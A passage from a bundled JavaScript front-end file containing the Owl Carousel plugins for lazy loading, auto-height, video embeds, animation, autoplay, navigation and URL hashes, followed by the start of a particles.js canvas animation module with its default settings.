                                    s = this._core.clones().length,
                                    r = a.proxy(function(e, t) {
                                        this.load(t)
                                    }, this);
                                for (0 < t.lazyLoadEager && (i += t.lazyLoadEager, t.loop && (o -= t.lazyLoadEager, i++)); n++ < i;) this.load(s / 2 + this._core.relative(o)), s && a.each(this._core.clones(this._core.relative(o)), r), o++
                            }
                        }, this)
                    }, this._core.options = a.extend({}, l.Defaults, this._core.options), this._core.$element.on(this._handlers)
                }).Defaults = {
                    lazyLoad: !1,
                    lazyLoadEager: 0
                }, l.prototype.load = function(e) {
                    var t = this._core.$stage.children().eq(e),
                        i = t && t.find(".owl-lazy");
                    !i || -1 < a.inArray(t.get(0), this._loaded) || (i.each(a.proxy(function(e, t) {
                        var i, n = a(t),
                            o = 1 < r.devicePixelRatio && n.attr("data-src-retina") || n.attr("data-src") || n.attr("data-srcset");
                        this._core.trigger("load", {
                            element: n,
                            url: o
                        }, "lazy"), n.is("img") ? n.one("load.owl.lazy", a.proxy(function() {
                            n.css("opacity", 1), this._core.trigger("loaded", {
                                element: n,
                                url: o
                            }, "lazy")
                        }, this)).attr("src", o) : n.is("source") ? n.one("load.owl.lazy", a.proxy(function() {
                            this._core.trigger("loaded", {
                                element: n,
                                url: o
                            }, "lazy")
                        }, this)).attr("srcset", o) : ((i = new Image).onload = a.proxy(function() {
                            n.css({
                                "background-image": 'url("' + o + '")',
                                opacity: "1"
                            }), this._core.trigger("loaded", {
                                element: n,
                                url: o
                            }, "lazy")
                        }, this), i.src = o)
                    }, this)), this._loaded.push(t.get(0)))
                }, l.prototype.destroy = function() {
                    var e, t;
                    for (e in this.handlers) this._core.$element.off(e, this.handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, a.fn.owlCarousel.Constructor.Plugins.Lazy = l, c = window.Zepto || window.jQuery, u = window, document, (d = function(e) {
                    this._core = e, this._previousHeight = null, this._handlers = {
                        "initialized.owl.carousel refreshed.owl.carousel": c.proxy(function(e) {
                            e.namespace && this._core.settings.autoHeight && this.update()
                        }, this),
                        "changed.owl.carousel": c.proxy(function(e) {
                            e.namespace && this._core.settings.autoHeight && "position" === e.property.name && this.update()
                        }, this),
                        "loaded.owl.lazy": c.proxy(function(e) {
                            e.namespace && this._core.settings.autoHeight && e.element.closest("." + this._core.settings.itemClass).index() === this._core.current() && this.update()
                        }, this)
                    }, this._core.options = c.extend({}, d.Defaults, this._core.options), this._core.$element.on(this._handlers), this._intervalId = null;
                    var t = this;
                    c(u).on("load", function() {
                        t._core.settings.autoHeight && t.update()
                    }), c(u).resize(function() {
                        t._core.settings.autoHeight && (null != t._intervalId && clearTimeout(t._intervalId), t._intervalId = setTimeout(function() {
                            t.update()
                        }, 250))
                    })
                }).Defaults = {
                    autoHeight: !1,
                    autoHeightClass: "owl-height"
                }, d.prototype.update = function() {
                    var e = this._core._current,
                        t = e + this._core.settings.items,
                        i = this._core.settings.lazyLoad,
                        n = this._core.$stage.children().toArray().slice(e, t),
                        o = [],
                        s = 0;
                    c.each(n, function(e, t) {
                        o.push(c(t).height())
                    }), (s = Math.max.apply(null, o)) <= 1 && i && this._previousHeight && (s = this._previousHeight), this._previousHeight = s, this._core.$stage.parent().height(s).addClass(this._core.settings.autoHeightClass)
                }, d.prototype.destroy = function() {
                    var e, t;
                    for (e in this._handlers) this._core.$element.off(e, this._handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, c.fn.owlCarousel.Constructor.Plugins.AutoHeight = d, h = window.Zepto || window.jQuery, window, p = document, (f = function(e) {
                    this._core = e, this._videos = {}, this._playing = null, this._handlers = {
                        "initialized.owl.carousel": h.proxy(function(e) {
                            e.namespace && this._core.register({
                                type: "state",
                                name: "playing",
                                tags: ["interacting"]
                            })
                        }, this),
                        "resize.owl.carousel": h.proxy(function(e) {
                            e.namespace && this._core.settings.video && this.isInFullScreen() && e.preventDefault()
                        }, this),
                        "refreshed.owl.carousel": h.proxy(function(e) {
                            e.namespace && this._core.is("resizing") && this._core.$stage.find(".cloned .owl-video-frame").remove()
                        }, this),
                        "changed.owl.carousel": h.proxy(function(e) {
                            e.namespace && "position" === e.property.name && this._playing && this.stop()
                        }, this),
                        "prepared.owl.carousel": h.proxy(function(e) {
                            if (e.namespace) {
                                var t = h(e.content).find(".owl-video");
                                t.length && (t.css("display", "none"), this.fetch(t, h(e.content)))
                            }
                        }, this)
                    }, this._core.options = h.extend({}, f.Defaults, this._core.options), this._core.$element.on(this._handlers), this._core.$element.on("click.owl.video", ".owl-video-play-icon", h.proxy(function(e) {
                        this.play(e)
                    }, this))
                }).Defaults = {
                    video: !1,
                    videoHeight: !1,
                    videoWidth: !1
                }, f.prototype.fetch = function(e, t) {
                    var i = e.attr("data-vimeo-id") ? "vimeo" : e.attr("data-vzaar-id") ? "vzaar" : "youtube",
                        n = e.attr("data-vimeo-id") || e.attr("data-youtube-id") || e.attr("data-vzaar-id"),
                        o = e.attr("data-width") || this._core.settings.videoWidth,
                        s = e.attr("data-height") || this._core.settings.videoHeight,
                        r = e.attr("href");
                    if (!r) throw new Error("Missing video URL.");
                    if (-1 < (n = r.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com|be\-nocookie\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/))[3].indexOf("youtu")) i = "youtube";
                    else if (-1 < n[3].indexOf("vimeo")) i = "vimeo";
                    else {
                        if (!(-1 < n[3].indexOf("vzaar"))) throw new Error("Video URL not supported.");
                        i = "vzaar"
                    }
                    n = n[6], this._videos[r] = {
                        type: i,
                        id: n,
                        width: o,
                        height: s
                    }, t.attr("data-video", r), this.thumbnail(e, this._videos[r])
                }, f.prototype.thumbnail = function(t, e) {
                    var i, n, o = e.width && e.height ? "width:" + e.width + "px;height:" + e.height + "px;" : "",
                        s = t.find("img"),
                        r = "src",
                        a = "",
                        l = this._core.settings,
                        c = function(e) {
                            i = l.lazyLoad ? h("<div/>", {
                                class: "owl-video-tn " + a,
                                srcType: e
                            }) : h("<div/>", {
                                class: "owl-video-tn",
                                style: "opacity:1;background-image:url(" + e + ")"
                            }), t.after(i), t.after('<div class="owl-video-play-icon"></div>')
                        };
                    if (t.wrap(h("<div/>", {
                        class: "owl-video-wrapper",
                        style: o
                    })), this._core.settings.lazyLoad && (r = "data-src", a = "owl-lazy"), s.length) return c(s.attr(r)), s.remove(), !1;
                    "youtube" === e.type ? (n = "//img.youtube.com/vi/" + e.id + "/hqdefault.jpg", c(n)) : "vimeo" === e.type ? h.ajax({
                        type: "GET",
                        url: "//vimeo.com/api/v2/video/" + e.id + ".json",
                        jsonp: "callback",
                        dataType: "jsonp",
                        success: function(e) {
                            n = e[0].thumbnail_large, c(n)
                        }
                    }) : "vzaar" === e.type && h.ajax({
                        type: "GET",
                        url: "//vzaar.com/api/videos/" + e.id + ".json",
                        jsonp: "callback",
                        dataType: "jsonp",
                        success: function(e) {
                            n = e.framegrab_url, c(n)
                        }
                    })
                }, f.prototype.stop = function() {
                    this._core.trigger("stop", null, "video"), this._playing.find(".owl-video-frame").remove(), this._playing.removeClass("owl-video-playing"), this._playing = null, this._core.leave("playing"), this._core.trigger("stopped", null, "video")
                }, f.prototype.play = function(e) {
                    var t, i = h(e.target).closest("." + this._core.settings.itemClass),
                        n = this._videos[i.attr("data-video")],
                        o = n.width || "100%",
                        s = n.height || this._core.$stage.height();
                    this._playing || (this._core.enter("playing"), this._core.trigger("play", null, "video"), i = this._core.items(this._core.relative(i.index())), this._core.reset(i.index()), (t = h('<iframe frameborder="0" allowfullscreen mozallowfullscreen webkitAllowFullScreen ></iframe>')).attr("height", s), t.attr("width", o), "youtube" === n.type ? t.attr("src", "//www.youtube.com/embed/" + n.id + "?autoplay=1&rel=0&v=" + n.id) : "vimeo" === n.type ? t.attr("src", "//player.vimeo.com/video/" + n.id + "?autoplay=1") : "vzaar" === n.type && t.attr("src", "//view.vzaar.com/" + n.id + "/player?autoplay=true"), h(t).wrap('<div class="owl-video-frame" />').insertAfter(i.find(".owl-video")), this._playing = i.addClass("owl-video-playing"))
                }, f.prototype.isInFullScreen = function() {
                    var e = p.fullscreenElement || p.mozFullScreenElement || p.webkitFullscreenElement;
                    return e && h(e).parent().hasClass("owl-video-frame")
                }, f.prototype.destroy = function() {
                    var e, t;
                    for (e in this._core.$element.off("click.owl.video"), this._handlers) this._core.$element.off(e, this._handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, h.fn.owlCarousel.Constructor.Plugins.Video = f, m = window.Zepto || window.jQuery, window, document, (g = function(e) {
                    this.core = e, this.core.options = m.extend({}, g.Defaults, this.core.options), this.swapping = !0, this.previous = void 0, this.next = void 0, this.handlers = {
                        "change.owl.carousel": m.proxy(function(e) {
                            e.namespace && "position" == e.property.name && (this.previous = this.core.current(), this.next = e.property.value)
                        }, this),
                        "drag.owl.carousel dragged.owl.carousel translated.owl.carousel": m.proxy(function(e) {
                            e.namespace && (this.swapping = "translated" == e.type)
                        }, this),
                        "translate.owl.carousel": m.proxy(function(e) {
                            e.namespace && this.swapping && (this.core.options.animateOut || this.core.options.animateIn) && this.swap()
                        }, this)
                    }, this.core.$element.on(this.handlers)
                }).Defaults = {
                    animateOut: !1,
                    animateIn: !1
                }, g.prototype.swap = function() {
                    if (1 === this.core.settings.items && m.support.animation && m.support.transition) {
                        this.core.speed(0);
                        var e, t = m.proxy(this.clear, this),
                            i = this.core.$stage.children().eq(this.previous),
                            n = this.core.$stage.children().eq(this.next),
                            o = this.core.settings.animateIn,
                            s = this.core.settings.animateOut;
                        this.core.current() !== this.previous && (s && (e = this.core.coordinates(this.previous) - this.core.coordinates(this.next), i.one(m.support.animation.end, t).css({
                            left: e + "px"
                        }).addClass("animated owl-animated-out").addClass(s)), o && n.one(m.support.animation.end, t).addClass("animated owl-animated-in").addClass(o))
                    }
                }, g.prototype.clear = function(e) {
                    m(e.target).css({
                        left: ""
                    }).removeClass("animated owl-animated-out owl-animated-in").removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut), this.core.onTransitionEnd()
                }, g.prototype.destroy = function() {
                    var e, t;
                    for (e in this.handlers) this.core.$element.off(e, this.handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, m.fn.owlCarousel.Constructor.Plugins.Animate = g, v = window.Zepto || window.jQuery, y = window, b = document, (w = function(e) {
                    this._core = e, this._call = null, this._time = 0, this._timeout = 0, this._paused = !0, this._handlers = {
                        "changed.owl.carousel": v.proxy(function(e) {
                            e.namespace && "settings" === e.property.name ? this._core.settings.autoplay ? this.play() : this.stop() : e.namespace && "position" === e.property.name && this._paused && (this._time = 0)
                        }, this),
                        "initialized.owl.carousel": v.proxy(function(e) {
                            e.namespace && this._core.settings.autoplay && this.play()
                        }, this),
                        "play.owl.autoplay": v.proxy(function(e, t, i) {
                            e.namespace && this.play(t, i)
                        }, this),
                        "stop.owl.autoplay": v.proxy(function(e) {
                            e.namespace && this.stop()
                        }, this),
                        "mouseover.owl.autoplay": v.proxy(function() {
                            this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
                        }, this),
                        "mouseleave.owl.autoplay": v.proxy(function() {
                            this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.play()
                        }, this),
                        "touchstart.owl.core": v.proxy(function() {
                            this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
                        }, this),
                        "touchend.owl.core": v.proxy(function() {
                            this._core.settings.autoplayHoverPause && this.play()
                        }, this)
                    }, this._core.$element.on(this._handlers), this._core.options = v.extend({}, w.Defaults, this._core.options)
                }).Defaults = {
                    autoplay: !1,
                    autoplayTimeout: 5e3,
                    autoplayHoverPause: !1,
                    autoplaySpeed: !1
                }, w.prototype._next = function(e) {
                    this._call = y.setTimeout(v.proxy(this._next, this, e), this._timeout * (Math.round(this.read() / this._timeout) + 1) - this.read()), this._core.is("interacting") || b.hidden || this._core.next(e || this._core.settings.autoplaySpeed)
                }, w.prototype.read = function() {
                    return (new Date).getTime() - this._time
                }, w.prototype.play = function(e, t) {
                    var i;
                    this._core.is("rotating") || this._core.enter("rotating"), e = e || this._core.settings.autoplayTimeout, i = Math.min(this._time % (this._timeout || e), e), this._paused ? (this._time = this.read(), this._paused = !1) : y.clearTimeout(this._call), this._time += this.read() % e - i, this._timeout = e, this._call = y.setTimeout(v.proxy(this._next, this, t), e - i)
                }, w.prototype.stop = function() {
                    this._core.is("rotating") && (this._time = 0, this._paused = !0, y.clearTimeout(this._call), this._core.leave("rotating"))
                }, w.prototype.pause = function() {
                    this._core.is("rotating") && !this._paused && (this._time = this.read(), this._paused = !0, y.clearTimeout(this._call))
                }, w.prototype.destroy = function() {
                    var e, t;
                    for (e in this.stop(), this._handlers) this._core.$element.off(e, this._handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, v.fn.owlCarousel.Constructor.Plugins.autoplay = w,
                function(s, e, t, i) {
                    "use strict";
                    var n = function(e) {
                        this._core = e, this._initialized = !1, this._pages = [], this._controls = {}, this._templates = [], this.$element = this._core.$element, this._overrides = {
                            next: this._core.next,
                            prev: this._core.prev,
                            to: this._core.to
                        }, this._handlers = {
                            "prepared.owl.carousel": s.proxy(function(e) {
                                e.namespace && this._core.settings.dotsData && this._templates.push('<div class="' + this._core.settings.dotClass + '">' + s(e.content).find("[data-dot]").addBack("[data-dot]").attr("data-dot") + "</div>")
                            }, this),
                            "added.owl.carousel": s.proxy(function(e) {
                                e.namespace && this._core.settings.dotsData && this._templates.splice(e.position, 0, this._templates.pop())
                            }, this),
                            "remove.owl.carousel": s.proxy(function(e) {
                                e.namespace && this._core.settings.dotsData && this._templates.splice(e.position, 1)
                            }, this),
                            "changed.owl.carousel": s.proxy(function(e) {
                                e.namespace && "position" == e.property.name && this.draw()
                            }, this),
                            "initialized.owl.carousel": s.proxy(function(e) {
                                e.namespace && !this._initialized && (this._core.trigger("initialize", null, "navigation"), this.initialize(), this.update(), this.draw(), this._initialized = !0, this._core.trigger("initialized", null, "navigation"))
                            }, this),
                            "refreshed.owl.carousel": s.proxy(function(e) {
                                e.namespace && this._initialized && (this._core.trigger("refresh", null, "navigation"), this.update(), this.draw(), this._core.trigger("refreshed", null, "navigation"))
                            }, this)
                        }, this._core.options = s.extend({}, n.Defaults, this._core.options), this.$element.on(this._handlers)
                    };
                    n.Defaults = {
                        nav: !1,
                        navText: ['<span aria-label="Previous">&#x2039;</span>', '<span aria-label="Next">&#x203a;</span>'],
                        navSpeed: !1,
                        navElement: 'button type="button" role="presentation"',
                        navContainer: !1,
                        navContainerClass: "owl-nav",
                        navClass: ["owl-prev", "owl-next"],
                        slideBy: 1,
                        dotClass: "owl-dot",
                        dotsClass: "owl-dots",
                        dots: !0,
                        dotsEach: !1,
                        dotsData: !1,
                        dotsSpeed: !1,
                        dotsContainer: !1
                    }, n.prototype.initialize = function() {
                        var e, i = this._core.settings;
                        for (e in this._controls.$relative = (i.navContainer ? s(i.navContainer) : s("<div>").addClass(i.navContainerClass).appendTo(this.$element)).addClass("disabled"), this._controls.$previous = s("<" + i.navElement + ">").addClass(i.navClass[0]).html(i.navText[0]).prependTo(this._controls.$relative).on("click", s.proxy(function(e) {
                            this.prev(i.navSpeed)
                        }, this)), this._controls.$next = s("<" + i.navElement + ">").addClass(i.navClass[1]).html(i.navText[1]).appendTo(this._controls.$relative).on("click", s.proxy(function(e) {
                            this.next(i.navSpeed)
                        }, this)), i.dotsData || (this._templates = [s('<button role="button">').addClass(i.dotClass).append(s("<span>")).prop("outerHTML")]), this._controls.$absolute = (i.dotsContainer ? s(i.dotsContainer) : s("<div>").addClass(i.dotsClass).appendTo(this.$element)).addClass("disabled"), this._controls.$absolute.on("click", "button", s.proxy(function(e) {
                            var t = s(e.target).parent().is(this._controls.$absolute) ? s(e.target).index() : s(e.target).parent().index();
                            e.preventDefault(), this.to(t, i.dotsSpeed)
                        }, this)), this._overrides) this._core[e] = s.proxy(this[e], this)
                    }, n.prototype.destroy = function() {
                        var e, t, i, n, o;
                        for (e in o = this._core.settings, this._handlers) this.$element.off(e, this._handlers[e]);
                        for (t in this._controls) "$relative" === t && o.navContainer ? this._controls[t].html("") : this._controls[t].remove();
                        for (n in this.overides) this._core[n] = this._overrides[n];
                        for (i in Object.getOwnPropertyNames(this)) "function" != typeof this[i] && (this[i] = null)
                    }, n.prototype.update = function() {
                        var e, t, i = this._core.clones().length / 2,
                            n = i + this._core.items().length,
                            o = this._core.maximum(!0),
                            s = this._core.settings,
                            r = s.center || s.autoWidth || s.dotsData ? 1 : s.dotsEach || s.items;
                        if ("page" !== s.slideBy && (s.slideBy = Math.min(s.slideBy, s.items)), s.dots || "page" == s.slideBy)
                            for (this._pages = [], e = i, t = 0; e < n; e++) {
                                if (r <= t || 0 === t) {
                                    if (this._pages.push({
                                        start: Math.min(o, e - i),
                                        end: e - i + r - 1
                                    }), Math.min(o, e - i) === o) break;
                                    t = 0, 0
                                }
                                t += this._core.mergers(this._core.relative(e))
                            }
                    }, n.prototype.draw = function() {
                        var e, t = this._core.settings,
                            i = this._core.items().length <= t.items,
                            n = this._core.relative(this._core.current()),
                            o = t.loop || t.rewind;
                        this._controls.$relative.toggleClass("disabled", !t.nav || i), t.nav && (this._controls.$previous.toggleClass("disabled", !o && n <= this._core.minimum(!0)), this._controls.$next.toggleClass("disabled", !o && n >= this._core.maximum(!0))), this._controls.$absolute.toggleClass("disabled", !t.dots || i), t.dots && (e = this._pages.length - this._controls.$absolute.children().length, t.dotsData && 0 != e ? this._controls.$absolute.html(this._templates.join("")) : 0 < e ? this._controls.$absolute.append(new Array(1 + e).join(this._templates[0])) : e < 0 && this._controls.$absolute.children().slice(e).remove(), this._controls.$absolute.find(".active").removeClass("active"), this._controls.$absolute.children().eq(s.inArray(this.current(), this._pages)).addClass("active"))
                    }, n.prototype.onTrigger = function(e) {
                        var t = this._core.settings;
                        e.page = {
                            index: s.inArray(this.current(), this._pages),
                            count: this._pages.length,
                            size: t && (t.center || t.autoWidth || t.dotsData ? 1 : t.dotsEach || t.items)
                        }
                    }, n.prototype.current = function() {
                        var i = this._core.relative(this._core.current());
                        return s.grep(this._pages, s.proxy(function(e, t) {
                            return e.start <= i && e.end >= i
                        }, this)).pop()
                    }, n.prototype.getPosition = function(e) {
                        var t, i, n = this._core.settings;
                        return "page" == n.slideBy ? (t = s.inArray(this.current(), this._pages), i = this._pages.length, e ? ++t : --t, t = this._pages[(t % i + i) % i].start) : (t = this._core.relative(this._core.current()), i = this._core.items().length, e ? t += n.slideBy : t -= n.slideBy), t
                    }, n.prototype.next = function(e) {
                        s.proxy(this._overrides.to, this._core)(this.getPosition(!0), e)
                    }, n.prototype.prev = function(e) {
                        s.proxy(this._overrides.to, this._core)(this.getPosition(!1), e)
                    }, n.prototype.to = function(e, t, i) {
                        var n;
                        !i && this._pages.length ? (n = this._pages.length, s.proxy(this._overrides.to, this._core)(this._pages[(e % n + n) % n].start, t)) : s.proxy(this._overrides.to, this._core)(e, t)
                    }, s.fn.owlCarousel.Constructor.Plugins.Navigation = n
                }(window.Zepto || window.jQuery, window, document),
                function(n, o, e, t) {
                    "use strict";
                    var i = function(e) {
                        this._core = e, this._hashes = {}, this.$element = this._core.$element, this._handlers = {
                            "initialized.owl.carousel": n.proxy(function(e) {
                                e.namespace && "URLHash" === this._core.settings.startPosition && n(o).trigger("hashchange.owl.navigation")
                            }, this),
                            "prepared.owl.carousel": n.proxy(function(e) {
                                if (e.namespace) {
                                    var t = n(e.content).find("[data-hash]").addBack("[data-hash]").attr("data-hash");
                                    if (!t) return;
                                    this._hashes[t] = e.content
                                }
                            }, this),
                            "changed.owl.carousel": n.proxy(function(e) {
                                if (e.namespace && "position" === e.property.name) {
                                    var i = this._core.items(this._core.relative(this._core.current())),
                                        t = n.map(this._hashes, function(e, t) {
                                            return e === i ? t : null
                                        }).join();
                                    if (!t || o.location.hash.slice(1) === t) return;
                                    o.location.hash = t
                                }
                            }, this)
                        }, this._core.options = n.extend({}, i.Defaults, this._core.options), this.$element.on(this._handlers), n(o).on("hashchange.owl.navigation", n.proxy(function(e) {
                            var t = o.location.hash.substring(1),
                                i = this._core.$stage.children(),
                                n = this._hashes[t] && i.index(this._hashes[t]);
                            void 0 !== n && n !== this._core.current() && this._core.to(this._core.relative(n), !1, !0)
                        }, this))
                    };
                    i.Defaults = {
                        URLhashListener: !1
                    }, i.prototype.destroy = function() {
                        var e, t;
                        for (e in n(o).off("hashchange.owl.navigation"), this._handlers) this._core.$element.off(e, this._handlers[e]);
                        for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                    }, n.fn.owlCarousel.Constructor.Plugins.Hash = i
                }(window.Zepto || window.jQuery, window, document),
                function(o, e, t, s) {
                    var r = o("<support>").get(0).style,
                        a = "Webkit Moz O ms".split(" "),
                        i = {
                            transition: {
                                end: {
                                    WebkitTransition: "webkitTransitionEnd",
                                    MozTransition: "transitionend",
                                    OTransition: "oTransitionEnd",
                                    transition: "transitionend"
                                }
                            },
                            animation: {
                                end: {
                                    WebkitAnimation: "webkitAnimationEnd",
                                    MozAnimation: "animationend",
                                    OAnimation: "oAnimationEnd",
                                    animation: "animationend"
                                }
                            }
                        },
                        n = function() {
                            return !!u("transform")
                        },
                        l = function() {
                            return !!u("perspective")
                        },
                        c = function() {
                            return !!u("animation")
                        };

                    function u(e, i) {
                        var n = !1,
                            t = e.charAt(0).toUpperCase() + e.slice(1);
                        return o.each((e + " " + a.join(t + " ") + t).split(" "), function(e, t) {
                            if (r[t] !== s) return n = !i || t, !1
                        }), n
                    }

                    function d(e) {
                        return u(e, !0)
                    }(function() {
                        return !!u("transition")
                    })() && (o.support.transition = new String(d("transition")), o.support.transition.end = i.transition.end[o.support.transition]), c() && (o.support.animation = new String(d("animation")), o.support.animation.end = i.animation.end[o.support.animation]), n() && (o.support.transform = new String(d("transform")), o.support.transform3d = l())
                }(window.Zepto || window.jQuery, window, document)
        }, {}
    ],
    7: [
        function(e, t, i) {
            var r = function(e, t) {
                var i = document.querySelector("#" + e + " > .particles-js-canvas-el");
                this.pJS = {
                    canvas: {
                        el: i,
                        w: i.offsetWidth,
                        h: i.offsetHeight
                    },
                    particles: {
                        number: {
                            value: 400,
                            density: {
                                enable: !0,
                                value_area: 800
                            }
                        },
                        color: {
                            value: "#fff"
                        },
                        shape: {
                            type: "circle",
                            stroke: {
                                width: 0,
                                color: "#ff0000"
                            },
                            polygon: {
                                nb_sides: 5
                            },
                            image: {
                                src: "",
                                width: 100,
                                height: 100
                            }
                        },
                        opacity: {
                            value: 1,
                            random: !1,
                            anim: {
                                enable: !1,
                                speed: 2,
                                opacity_min: 0,
                                sync: !1
                            }
                        },
                        size: {
                            value: 20,
                            random: !1,
                            anim: {
                                enable: !1,
                                speed: 20,
                                size_min: 0,
                                sync: !1
                            }
                        },
                        line_linked: {
                            enable: !0,
                            distance: 100,
                            color: "#fff",
                            opacity: 1,
                            width: 1
                        },
                        move: {
                            enable: !0,
                            speed: 2,
                            direction: "none",
                            random: !1,
                            straight: !1,
                            out_mode: "out",
                            bounce: !1,
                            attract: {
                                enable: !1,
                                rotateX: 3e3,
                                rotateY: 3e3
                            }
                        },
                        array: []
                    },
                    interactivity: {
                        detect_on: "canvas",
                        events: {
                            onhover: {
                                enable: !0,
                                mode: "grab"
                            },
                            onclick: {
                                enable: !0,
                                mode: "push"
                            },
                            resize: !0
                        },
                        modes: {
                            grab: {
                                distance: 100,
                                line_linked: {
                                    opacity: 1
                                }
                            },
                            bubble: {
                                distance: 200,
                                size: 80,
                                duration: .4
                            },
                            repulse: {
                                distance: 200,
                                duration: .4
                            },
                            push: {
                                particles_nb: 4
                            },
                            remove: {
                                particles_nb: 2
                            }
                        },
                        mouse: {}
                    },
                    retina_detect: !1,
                    fn: {
                        interact: {},
                        modes: {},
                        vendors: {}
                    },
                    tmp: {}
                };
                var p = this.pJS;
                t && Object.deepExtend(p, t), p.tmp.obj = {
                    size_value: p.particles.size.value,
                    size_anim_speed: p.particles.size.anim.speed,
                    move_speed: p.particles.move.speed,
                    line_linked_distance: p.particles.line_linked.distance,
                    line_linked_width: p.particles.line_linked.width,
                    mode_grab_distance: p.interactivity.modes.grab.distance,
                    mode_bubble_distance: p.interactivity.modes.bubble.distance,
                    mode_bubble_size: p.interactivity.modes.bubble.size,
                    mode_repulse_distance: p.interactivity.modes.repulse.distance
                }, p.fn.retinaInit = function() {
                    p.retina_detect && 1 < window.devicePixelRatio ? (p.canvas.pxratio = window.devicePixelRatio, p.tmp.retina = !0) : (p.canvas.pxratio = 1, p.tmp.retina = !1), p.canvas.w = p.canvas.el.offsetWidth * p.canvas.pxratio, p.canvas.h = p.canvas.el.offsetHeight * p.canvas.pxratio, p.particles.size.value = p.tmp.obj.size_value * p.canvas.pxratio, p.particles.size.anim.speed = p.tmp.obj.size_anim_speed * p.canvas.pxratio, p.particles.move.speed = p.tmp.obj.move_speed * p.canvas.pxratio, p.particles.line_linked.distance = p.tmp.obj.line_linked_distance * p.canvas.pxratio, p.interactivity.modes.grab.distance = p.tmp.obj.mode_grab_distance * p.canvas.pxratio, p.interactivity.modes.bubble.distance = p.tmp.obj.mode_bubble_distance * p.canvas.pxratio, p.particles.line_linked.width = p.tmp.obj.line_linked_width * p.canvas.pxratio, p.interactivity.modes.bubble.size = p.tmp.obj.mode_bubble_size * p.canvas.pxratio, p.interactivity.modes.repulse.distance = p.tmp.obj.mode_repulse_distance * p.canvas.pxratio
                }, p.fn.canvasInit = function() {
                    p.canvas.ctx = p.canvas.el.getContext("2d")
                }, p.fn.canvasSize = function() {
                    p.canvas.el.width = p.canvas.w, p.canvas.el.height = p.canvas.h, p && p.interactivity.events.resize && window.addEventListener("resize", function() {
                        p.canvas.w = p.canvas.el.offsetWidth, p.canvas.h = p.canvas.el.offsetHeight, p.tmp.retina && (p.canvas.w *= p.canvas.pxratio, p.canvas.h *= p.canvas.pxratio), p.canvas.el.width = p.canvas.w, p.canvas.el.height = p.canvas.h, p.particles.move.enable || (p.fn.particlesEmpty(), p.fn.particlesCreate(), p.fn.particlesDraw(), p.fn.vendors.densityAutoParticles()), p.fn.vendors.densityAutoParticles()
                    })
                }, p.fn.canvasPaint = function() {
                    p.canvas.ctx.fillRect(0, 0, p.canvas.w, p.canvas.h)
                }, p.fn.canvasClear = function() {
                    p.canvas.ctx.clearRect(0, 0, p.canvas.w, p.canvas.h)
                }, p.fn.particle = function(e, t, i) {
                    if (this.radius = (p.particles.size.random ? Math.random() : 1) * p.particles.size.value, p.particles.size.anim.enable && (this.size_status = !1, this.vs = p.particles.size.anim.speed / 100, p.particles.size.anim.sync || (this.vs = this.vs * Math.random())), this.x = i ? i.x : Math.random() * p.canvas.w, this.y = i ? i.y : Math.random() * p.canvas.h, this.x > p.canvas.w - 2 * this.radius ? this.x = this.x - this.radius : this.x < 2 * this.radius && (this.x = this.x + this.radius), this.y > p.canvas.h - 2 * this.radius ? this.y = this.y - this.radius : this.y < 2 * this.radius && (this.y = this.y + this.radius), p.particles.move.bounce && p.fn.vendors.checkOverlap(this, i), this.color = {}, "object" == typeof e.value)
                        if (e.value instanceof Array) {
                            var n = e.value[Math.floor(Math.random() * p.particles.color.value.length)];
                            this.color.rgb = l(n)
                        } else null != e.value.r && null != e.value.g && null != e.value.b && (this.color.rgb = {
                            r: e.value.r,
                            g: e.value.g,
                            b: e.value.b
                        }), null != e.value.h && null != e.value.s && null != e.value.l && (this.color.hsl = {
                            h: e.value.h,
                            s: e.value.s,
                            l: e.value.l
                        });
                    else "random" == e.value ? this.color.rgb = {
                        r: Math.floor(256 * Math.random()) + 0,
                        g: Math.floor(256 * Math.random()) + 0,
                        b: Math.floor(256 * Math.random()) + 0
                    } : "string" == typeof e.value && (this.color = e, this.color.rgb = l(this.color.value));
                    this.opacity = (p.particles.opacity.random ? Math.random() : 1) * p.particles.opacity.value, p.particles.opacity.anim.enable && (this.opacity_status = !1, this.vo = p.particles.opacity.anim.speed / 100, p.particles.opacity.anim.sync || (this.vo = this.vo * Math.random()));
                    var o = {};
                    switch (p.particles.move.direction) {
                        case "top":
                            o = {
                                x: 0,
                                y: -1
                            };
                            break;
                        case "top-right":
                            o = {
                                x: .5,
                                y: -.5
                            };
                            break;
                        case "right":
                            o = {
                                x: 1,
                                y: -0
                            };
                            break;
                        case "bottom-right":
                            o = {
                                x: .5,
                                y: .5
                            };
                            break;
                        case "bottom":
                            o = {
                                x: 0,
                                y: 1
                            };
                            break;
                        case "bottom-left":
                            o = {
                                x: -.5,
                                y: 1
                            };
                            break;
                        case "left":
                            o = {
                                x: -1,
                                y: 0
                            };
                            break;
                        case "top-left":
                            o = {
                                x: -.5,
                                y: -.5
                            };
                            break;
                        default:
                            o = {
                                x: 0,
                                y: 0
                            }
                    }
                    p.particles.move.straight ? (this.vx = o.x, this.vy = o.y, p.particles.move.random && (this.vx = this.vx * Math.random(), this.vy = this.vy * Math.random())) : (this.vx = o.x + Math.random() - .5, this.vy = o.y + Math.random() - .5), this.vx_i = this.vx, this.vy_i = this.vy;
                    var s = p.particles.shape.type;
                    if ("object" == typeof s) {
                        if (s instanceof Array) {
                            var r = s[Math.floor(Math.random() * s.length)];
                            this.shape = r
                        }
                    } else this.shape = s; if ("image" == this.shape) {
                        var a = p.particles.shape;
                        this.img = {
                            src: a.image.src,
                            ratio: a.image.width / a.image.height
